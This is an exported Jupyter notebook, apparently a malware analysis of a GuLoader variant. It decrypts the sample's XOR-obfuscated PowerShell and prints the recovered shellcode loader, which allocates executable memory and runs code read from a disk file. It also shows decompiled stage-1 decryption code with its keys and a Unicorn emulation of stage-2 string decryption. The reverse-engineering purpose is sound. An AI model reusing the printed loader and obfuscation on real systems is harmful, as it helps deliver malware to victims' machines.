<span class="s1">$Kabar4 = HTB 'A9CFE2FFE3E8E2A3C9E8EBE4E3E8C0E8F9E5E2E9A5A9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8BFA1ADA9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8BEA1ADA9C0ECE1E0F4A1ADA9CCE0EFE4E1ECE8FBE2F8FEA4A3DEE8F9C4E0FDE1E8E0E8E3F9ECF9E4E2E3CBE1ECEAFEA5A9CBE4F9EEE5E8F9BAA4';</span>
<span class="s1">udvalgsprocedure9 $Kabar4;</span>
<span class="s1">$Kabar5 = HTB 'FFE8F9F8FFE3ADA9CFE2FFE3E8E2A3CEFFE8ECF9E8D9F4FDE8A5A4';</span>
<span class="s1">udvalgsprocedure9 $Kabar5   ;</span>
<span class="s1">}$Nonperforated = HTB 'E6E8FFE3E8E1BEBF';</span>
<span class="s1">$Brndselsforbrug = HTB 'F8FEE8FFBEBF';</span>
<span class="s1">$Sottishness03 = HTB 'CAE8F9CEE2E3FEE2E1E8DAE4E3E9E2FA';</span>
<span class="s1">$Sottishness00=HTB 'DEE5E2FADAE4E3E9E2FA';</span>
<span class="s1">$Kabar6 = HTB 'A9E7E2FFE9EBE2FFE9E8E1E4E3EAE8FFE3E8FEADB0ADD6DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C0ECFFFEE5ECE1D0B7B7CAE8F9C9E8E1E8EAECF9E8CBE2FFCBF8E3EEF9E4E2E3DDE2E4E3F9E8FFA5A5EBE6FDADA9C3E2E3FDE8FFEBE2FFECF9E8E9ADA9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8B9A4A1ADA5CAC9D9ADCDA5D6C4E3F9DDF9FFD0A1ADD6D8C4E3F9BEBFD0A1ADD6D8C4E3F9BEBFD0A1ADD6D8C4E3F9BEBFD0A4ADA5D6C4E3F9DDF9FFD0A4A4A4';</span>
<span class="s1">udvalgsprocedure9 $Kabar6;</span>
<span class="s1">$Sottishness01 = HTB 'A9E3E2E3E9E4FDF9E8FFE2F8FEADB0ADD6DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C0ECFFFEE5ECE1D0B7B7CAE8F9C9E8E1E8EAECF9E8CBE2FFCBF8E3EEF9E4E2E3DDE2E4E3F9E8FFA5A5EBE6FDADA9CFFFE3E9FEE8E1FEEBE2FFEFFFF8EAADA9DEE2F9F9E4FEE5E3E8FEFEBDBDA4A1ADA5CAC9D9ADCDA5D6C4E3F9DDF9FFD0A1ADD6D8C4E3F9BEBFD0A4ADA5D6C4E3F9DDF9FFD0A4A4A4';</span>
<span class="s1">udvalgsprocedure9 $Sottishness01;</span>
<span class="s1">$Sottishness02 = HTB 'A9C9E2FAE3EEFFE4E8E9ADB0ADD6DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C0ECFFFEE5ECE1D0B7B7CAE8F9C9E8E1E8EAECF9E8CBE2FFCBF8E3EEF9E4E2E3DDE2E4E3F9E8FFA5A5EBE6FDADA9C3E2E3FDE8FFEBE2FFECF9E8E9ADA9DEE2F9F9E4FEE5E3E8FEFEBDBEA4A1ADA5CAC9D9ADCDA5D6C4E3F9DDF9FFD0A4ADA5D6C4E3F9DDF9FFD0A4A4A4';</span>
<span class="s1">udvalgsprocedure9 $Sottishness02;</span>
<span class="s1">$Kabar7 = HTB 'A9D8E3EEF8E1F9E4FBECEFE1E8ADB0ADA9C9E2FAE3EEFFE4E8E9A3C4E3FBE2E6E8A5BDA4';</span>
<span class="s1">udvalgsprocedure9 $Kabar7;</span>
<span class="s1">$Kabar7 = HTB 'A9E3E2E3E9E4FDF9E8FFE2F8FEA3C4E3FBE2E6E8A5A9D8E3EEF8E1F9E4FBECEFE1E8A1ADBDA4';</span>
<span class="s1">udvalgsprocedure9 $Kabar7;</span>
<span class="s1">$Sottishness04 = fkp $udvalgsprocedure5 $udvalgsprocedure6;</span>
<span class="s1">$Kabar7 = HTB 'A9CEECFEF8E4FEF9E4EEECE1E1F4BEADB0ADA9E7E2FFE9EBE2FFE9E8E1E4E3EAE8FFE3E8FEA3C4E3FBE2E6E8A5D6C4E3F9DDF9FFD0B7B7D7E8FFE2A1ADBEBCBBA1ADBDF5BEBDBDBDA1ADBDF5B9BDA4';</span>
<span class="s1">udvalgsprocedure9 $Kabar7;</span>
<span class="s1">$Kabar8 = HTB 'A9D8E3FEECE4E3F9E1E4E3E8FEFEADB0ADA9E7E2FFE9EBE2FFE9E8E1E4E3EAE8FFE3E8FEA3C4E3FBE2E6E8A5D6C4E3F9DDF9FFD0B7B7D7E8FFE2A1ADBDF5BCBDBDBDBDBDA1ADBDF5BEBDBDBDA1ADBDF5B9A4';</span>
<span class="s1">udvalgsprocedure9 $Kabar8;</span>
<span class="s1">$Casuistically2="rgmlfaelooallpmlvlnvuislrreellesglrrslrndsrfooorrtyvenaudpoubrpdgaaaslraoddernnoanlergpaeyeefaonoaiitiiuahhglkkaedazrrafrecrcieennipurralanidnkeueraeapeaoaoeofrreevlrxuutefyinuireraanslealiieaaodrrclieeiuauraorreeoeboeojjluricahanieasaneueuaeleohnmriarlioaaegtralioleraonearouvoieobohrveneeaafodeiiitinotdieieplaleeideoooeaaorrntiaiaotopnehekeatlriovaaadlnaoionauitinuaalnrevioeeetspnleeenoloeeeouuinrpuaijojoaovaoarroyopoaynupnoamouamsmpdundpuoinruuraroyanrsenifeaeuopernoeiilauhcricaokcarodvoorbaioelcloauemaauuijtlrrrntaarreaoutneayenpkrwieeokenleioeerkoseeouapauunoleydriakeaexaneeupiuhaiovantesneoeuaaaigyokhieoiroarueivuoetnliisnunyeiaupogylhieetuaoutejdioleakriiaaeheaictaeuaeonutlexseosfkoaeeepknkrnpueeaoeiuamyhvenpluoymohaauoiyaostiuindklaeyapeayloaoaasnyehoorerpeevraooiietoaaeeooieloiirsayadnaeaaaiftrooidvalauieaeearnonaevuuyaerelkoaduecoayonsaroieueiaiiovunriisolkosuaaroeayiuoiiaureeyatdnureafnnaevhnhaitlryrrkupuofbmrrpiunnuakarkalohnuoudeyriegnrdejivnonnnkevruugeoeleoanalahsaoylapenujpiueemiieuludkudeeesloreieeleiaarlaohvnouarurlveurrorumetnvnpruinnhremoleiikooialteieersidbpigneuoprloelyvooyavennipaaiepafenokaeiaeraeteiweoevgakrouaktatilsunqleoefnugiaevaeamnuarnoiinelr"</span>
<span class="s1">'''</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">key</span><span class="p">):</span>
    <span class="n">tmp_data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">tmp_data</span><span class="p">:</span>
        <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="n">key</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>


<span class="n">egg</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">"HTB '([^']*)'"</span>

<span class="n">str_map</span> <span class="o">=</span> <span class="p">{}</span>

<span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">re</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">egg</span><span class="p">,</span> <span class="n">ps_data</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">ptxt_data</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">141</span><span class="p">)</span>
    <span class="n">str_map</span><span class="p">[</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">()]</span> <span class="o">=</span> <span class="n">ptxt_data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span>

<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">str_map</span><span class="p">:</span>
    <span class="n">ps_data</span> <span class="o">=</span> <span class="n">ps_data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="s2">"'"</span> <span class="o">+</span> <span class="n">str_map</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"'"</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="n">ps_data</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

</div>
    

<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h4 id="Shellcode-Loader">
<a class="anchor" href="#Shellcode-Loader" aria-hidden="true"><span class="octicon octicon-link"></span></a>Shellcode Loader<a class="anchor-link" href="#Shellcode-Loader"> </a>
</h4>
<p>Once the strings have been decrypted it is clear that the powershell is used to read shellcode from the <code>Semiskilled.Slv</code> file. This code is split at 0x400 and 0x53c and copied into two allocated buffers. The first buffer is then called and the second buffer passed as an argument along with a pointer to <code>NtProtectVirtualMemory</code>.</p>

</div>
</div>
</div>$Buffer1_RWX = $VirtualAlloc.Invoke([IntPtr]::Zero,     316, 0x3000, PAGE_EXECUTE_READWRITE)
$Buffer2_RW = $VirtualAlloc.Invoke([IntPtr]::Zero, 0x100000, 0x3000, PAGE_READWRITE)

$ShellCode = [System.IO.File]::ReadAllBytes('$env:LOCALAPPDATA\Ecphorize\Gonocoele\Semiskilled.Slv')

[System.Runtime.InteropServices.Marshal]::Copy($ShellCode, 1024,  $Buffer1_RWX , 316)

[System.Runtime.InteropServices.Marshal]::Copy($ShellCode, 316+1024, $Buffer2_RW , $ShellCode.count-316-1024)

$ShellCodeEntry = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($Buffer1_RWX , (GDT @([IntPtr],[IntPtr]) ([Void])))

$ShellCodeEntry.Invoke($Buffer2_RW , fkp ntdll NtProtectVirtualMemory)

<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h4 id="Guloader-Shellcode-Stage-1">
<a class="anchor" href="#Guloader-Shellcode-Stage-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Guloader Shellcode Stage 1<a class="anchor-link" href="#Guloader-Shellcode-Stage-1"> </a>
</h4>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<p>The first stage of the shellcode has heavy obfuscation but it is a simple loader and decryptor used to decrypt the buffer that is passed as an argument from the PowerShells script. The decryption is an XOR with the key 0xA980E98A.</p>
<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="n">__usercall</span> <span class="n">sub_0</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="err">@</span><span class="o">&lt;</span><span class="n">ebp</span><span class="o">&gt;</span><span class="p">,</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">a2</span><span class="p">)(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// ebp</span>
  <span class="kt">void</span> <span class="p">(</span><span class="kr">__stdcall</span> <span class="o">*</span><span class="n">v4</span><span class="p">)(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span> <span class="c1">// edx</span>
  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// esi</span>
  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// ecx</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// eax</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="n">a1</span> <span class="o">-</span> <span class="mi">768</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">256</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x100000</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">260</span><span class="p">)</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__stdcall</span> <span class="o">*</span><span class="p">)(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">))(</span><span class="n">a3</span> <span class="o">+</span> <span class="mi">5</span><span class="p">);</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">do</span>
      <span class="o">++</span><span class="n">v6</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">+</span> <span class="n">v6</span><span class="p">)</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a3</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="p">);</span>
    <span class="o">++</span><span class="n">v5</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a3</span> <span class="o">+</span> <span class="n">v6</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xB8</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v4</span><span class="p">(</span><span class="mi">-1</span><span class="p">,</span> <span class="n">v3</span> <span class="o">+</span> <span class="mi">260</span><span class="p">,</span> <span class="n">v3</span> <span class="o">+</span> <span class="mi">256</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">v3</span> <span class="o">+</span> <span class="mi">156</span><span class="p">);</span>
      <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">!=</span> <span class="mh">0x29B28</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span> <span class="p">)</span>
        <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">a2</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">^=</span> <span class="mh">0xA980E98A</span><span class="p">;</span>
      <span class="n">a2</span><span class="p">();</span>
      <span class="n">JUMPOUT</span><span class="p">(</span><span class="mh">0x13C</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>

</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h4 id="Guloader-Shellcode-Stage-2">
<a class="anchor" href="#Guloader-Shellcode-Stage-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Guloader Shellcode Stage 2<a class="anchor-link" href="#Guloader-Shellcode-Stage-2"> </a>
</h4>
<p>The second stage shellcode is a version of the main guloader stage2 shellcode. Some of the same functions exist in this shellcode as the original shellcode we analyzed above.</p>
<p>SHA256 = <code>E3A8356689B97653261EA6B75CA911BC65F523025F15649E87B1AEF0071AE107</code> <a href="https://malshare.com/sample.php?action=detail&amp;hash=e3a8356689b97653261ea6b75ca911bc65f523025f15649e87b1aef0071ae107">malshare</a></p>
<p>key_len = 44</p>

</div>
</div>
</div>
    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s1">'3d4f0b6d845f58cbf8844e9ab35781156c68109175e8c42901f8ee2b78c4926631939c778b2a48e0d8ea0dd585'</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

</div>
    

    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="k">def</span> <span class="nf">xor_crypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
        <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>

<span class="n">egg</span> <span class="o">=</span> <span class="n">xor_crypt</span><span class="p">(</span><span class="sa">b</span><span class="s1">'http'</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="n">egg</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>

<span class="n">stage2_data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/tmp/Semiskilled.Slv_shellcode_stage_2_patched.bin'</span><span class="p">,</span><span class="s1">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">c2_offset</span> <span class="o">=</span> <span class="n">stage2_data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">egg</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">c2_offset</span><span class="p">)</span>

<span class="n">xor_crypt</span><span class="p">(</span><span class="n">stage2_data</span><span class="p">[</span><span class="n">c2_offset</span><span class="p">:</span><span class="n">c2_offset</span><span class="o">+</span><span class="mi">100</span><span class="p">],</span> <span class="n">key</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

<div class="output_wrapper">
<div class="output">

<div class="output_area">

<div class="output_subarea output_stream output_stdout output_text">
<pre>553b7f1d
-1
</pre>
</div>
</div>

<div class="output_area">



<div class="output_text output_subarea output_execute_result">
<pre>b''</pre>
</div>

</div>

</div>
</div>

</div>
    

    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s1">'48 4F 78 6D E1 5F 2A CB CB 84 7C 9A'</span><span class="p">)</span>
<span class="n">xor_crypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">,</span><span class="sa">b</span><span class="s1">''</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

<div class="output_wrapper">
<div class="output">

<div class="output_area">



<div class="output_text output_subarea output_execute_result">
<pre>b'user32'</pre>
</div>

</div>

</div>
</div>

</div>
    

<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h4 id="VEH-Program-Flow-Redirection">
<a class="anchor" href="#VEH-Program-Flow-Redirection" aria-hidden="true"><span class="octicon octicon-link"></span></a>VEH Program Flow Redirection<a class="anchor-link" href="#VEH-Program-Flow-Redirection"> </a>
</h4>
<p>As described in both the <a href="https://www.crowdstrike.com/blog/guloader-dissection-reveals-new-anti-analysis-techniques-and-code-injection-redundancy/">CrowdStrike</a> and <a href="https://unit42.paloaltonetworks.com/guloader-variant-anti-analysis/">Unit42</a> blogs Guloader uses an VEH to both do some anti-debugging checks and redirect the program flow.</p>
<p>The way this works is the VEH redirects EIP using a decoding routing based on byte the follows the INT3 (<code>cc</code>) instruction which caused the excpetion. In the code <code>jmp</code> instructions have been replaced with INT3 and an encoded byte. There is a nice <a href="https://github.com/pan-unit42/public_tools/blob/master/idapython-guloader-anti-analysis/guloader_veh_anti_analysis_.py">IDA Python plugin</a> from Unit42 that will automatically replace the INT3 code with JMPs. ** Remember you need to update the XOR byte in the plugin for the version of guloader you are analyzing.</p>

</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h4 id="String-Decryption">
<a class="anchor" href="#String-Decryption" aria-hidden="true"><span class="octicon octicon-link"></span></a>String Decryption<a class="anchor-link" href="#String-Decryption"> </a>
</h4>
</div>
</div>
</div>
    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">unicorn</span> <span class="k">as</span> <span class="nn">uc</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="c1"># This is just to print each instruction address as it's emulated</span>
<span class="k">def</span> <span class="nf">hook_call</span><span class="p">(</span><span class="n">uc_engine</span><span class="p">,</span> <span class="n">mem_type</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="n">eip</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EIP</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"EIP: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">eip</span><span class="o">-</span><span class="mh">0x10000</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="kc">True</span>


<span class="n">buf</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/tmp/Guloader_stage_2.bin'</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">uc_engine</span> <span class="o">=</span> <span class="n">uc</span><span class="o">.</span><span class="n">Uc</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">UC_ARCH_X86</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_MODE_32</span><span class="p">)</span>
<span class="n">STACK_ADDR</span> <span class="o">=</span> <span class="mh">0x900000</span>
<span class="n">CODE_ADDR</span> <span class="o">=</span> <span class="mh">0x10000</span>

<span class="c1"># Load shellcode into mem</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">CODE_ADDR</span><span class="p">,</span> <span class="mh">0x300000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">CODE_ADDR</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>

<span class="c1"># Set shellcode entrypoint</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EIP</span><span class="p">,</span> <span class="n">CODE_ADDR</span><span class="p">)</span>

<span class="c1"># Setup the stack memory</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">STACK_ADDR</span> <span class="o">-</span> <span class="mh">0x100000</span><span class="p">,</span> <span class="mh">0x200000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_ESP</span><span class="p">,</span> <span class="n">STACK_ADDR</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EBP</span><span class="p">,</span> <span class="n">STACK_ADDR</span><span class="p">)</span>


<span class="c1"># This is our hook just for fun</span>
<span class="n">hook1</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">UC_HOOK_CODE</span><span class="p">,</span> <span class="n">hook_call</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>

<span class="c1"># Setup our arguments/buffers</span>

<span class="n">EAX_BUFF</span> <span class="o">=</span> <span class="mh">0x500000</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EAX_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EAX</span><span class="p">,</span> <span class="n">EAX_BUFF</span><span class="p">)</span>

<span class="c1"># This sort of works like a 'push' to push the buffer address onto the stack</span>
<span class="n">EBP_BUFF</span> <span class="o">=</span> <span class="mh">0x600000</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EBP_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">STACK_ADDR</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span><span class="n">EBP_BUFF</span><span class="p">))</span>


<span class="n">EDI_BUFF</span> <span class="o">=</span> <span class="mh">0x700000</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EDI_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EDI</span><span class="p">,</span> <span class="n">EDI_BUFF</span><span class="p">)</span>


<span class="n">ARG_BUFF</span> <span class="o">=</span> <span class="mh">0x400000</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">ARG_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">STACK_ADDR</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span><span class="n">ARG_BUFF</span><span class="p">))</span>

<span class="n">FN_START</span> <span class="o">=</span> <span class="mh">0X08A55</span> <span class="o">+</span> <span class="n">CODE_ADDR</span>
<span class="n">FN_END</span> <span class="o">=</span> <span class="mh">0x08D3F</span> <span class="o">+</span> <span class="n">CODE_ADDR</span>

<span class="n">uc_engine</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">FN_START</span><span class="p">,</span> <span class="n">FN_END</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="c1">#out_eip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_EIP)</span>
</pre></div>

    </div>
</div>
</div>

<div class="output_wrapper">
<div class="output">

<div class="output_area">

<div class="output_subarea output_stream output_stdout output_text">
<pre>EIP: 0x8a55
EIP: 0x8a57
EIP: 0x8a59
EIP: 0x8a5d
EIP: 0x8a63
EIP: 0x8a69
EIP: 0x8a6f
